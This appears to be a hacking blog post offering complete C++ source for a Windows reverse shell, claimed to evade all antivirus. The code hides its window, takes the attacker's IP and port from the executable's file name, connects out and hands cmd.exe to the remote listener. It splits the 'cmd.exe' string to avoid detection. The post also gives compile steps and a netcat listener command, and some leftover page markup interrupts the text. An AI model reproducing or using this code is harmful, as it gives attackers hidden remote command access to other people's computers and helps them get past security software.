Today i share a c++ reverse shell source code for windows , as time of writing , its fully undetectable !
Its bypassing all antivirus solutions and works with
- Windows 11 
- Windows 10 
- Windows 8 
- Windows 7 
- Windows Server 2019 
- Windows Server 2016 

The source code is not obfuscated and if along the way get detected by av solutions , We can obfuscate it and its ready to go again !

One of the cool methods of this reverse shell is the ip and port for your listiner , Its hardcoded on name of the .exe file !

For Example your listiner ip and port is = 192.168.1.1:8080
You rename the exe file to this :
```
192x168x1x1_8080.exe
```

# How Compile It

#### First you copy the source code :
```c
#include <winsock2.h>
#include <stdio.h>
#include <string>
#include <tchar.h>
#include <Windows.h>

#pragma comment(lib,"ws2_32")
#pragma warning(disable:4996) 
WSADATA wsaData; SOCKET s1;
struct sockaddr_in R;
STARTUPINFO A;
PROCESS_INFORMATION B;
using std::string;
string getFileName(const string& s) {

	char sep = '/';
	
	#ifdef _WIN32
		sep = '\\';
	#endif
	size_t i = s.rfind(sep, s.length());
	if (i != string::npos) {
		return(s.substr(i + 1, s.length() - i));
	}

	return("");
}

int main(int argc, char *argv[])
{
	FreeConsole(); //Hide window
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	string path =getFileName(argv[0]);
	path.resize(path.size() - 4); //remove .exe from the file
	//replace x to "."
	for (int i = 0; i < path.size(); i++) {
		if (path[i] == 'x') {
			path[i] = '.';
		}
	}
	//PORT and IP from the executable
	size_t i = path.rfind("_", path.length());
	string port = path.substr(i+1, i-path.length());
	string ip = path.substr(0, i);
	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
	R.sin_family = AF_INET;
	R.sin_port = htons(std::stoul(port, nullptr, 0));
	R.sin_addr.s_addr = inet_addr(ip.c_str());
	WSAConnect(s1, (SOCKADDR*)&R, sizeof(R), 0, 0, 0, 0);
	memset(&A, 0, sizeof(A));
	A.cb = sizeof(A);
	A.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	A.hStdInput = A.hStdOutput = A.hStdError = (HANDLE)s1;
	TCHAR c[256] = L"cm";
	TCHAR d[256] = L"d.exe";
	CreateProcess(NULL, _tcscat(c, d), 0, 0, 1, 0, 0, 0, &A, &B);

}
```
#### Second Save it with whatever name you want with .cpp extension 
For Example I Save The Source Code With This Name :
```
mine.cpp
```
You can compile this in two ways :
- Visual Studio
- MSVC Compiler
For compiling in visual studio you just have to make a new project and add the .cpp file to the project and compile for x64 .

If you dont have visual studio , you can use Microsoft MSVC Compiler Tool

      link: "https://docs.microsoft.com/en-us/cpp/build/reference/compiler-options?view=msvc-170",
    },
  ]}
/>

After Downloading MSVC Compiler Tool you just have to open new cmd or powershell prompt on the folder you saved .cpp file and run this command :
```
cl.exe mine.cpp
```
Thats It ! After compiling you have a exe file named mine.exe .
Rename the exe file with your listiner ip and port like this :
```
192x168x1x1_8080.exe
```
Now you just have listen a port and run the exe file on the windows system . 

# Listen a port on Windows

For listen a port on windows and get the reverse connection , i suggest netcan for windows

    },
  ]}

After downloading netcat for windows listen a port with this command :
```
nc64.exe -lvnp 8080
```
Thats it . I hope you enjoyed today post , See you next time ;)
